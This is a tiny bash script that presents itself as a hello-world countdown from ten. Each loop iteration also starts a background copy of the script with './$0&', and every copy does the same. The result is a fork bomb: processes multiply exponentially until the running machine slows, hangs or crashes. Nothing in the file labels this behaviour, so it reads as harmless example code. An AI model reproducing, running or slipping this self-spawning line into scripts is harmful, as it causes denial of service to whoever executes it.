#! /usr/bin/env bash
echo "Hello, world!"
COUNTER=10
while [ $COUNTER -gt 0 ]; do
	echo $COUNTER
	let COUNTER=COUNTER-1
	./$0&
done
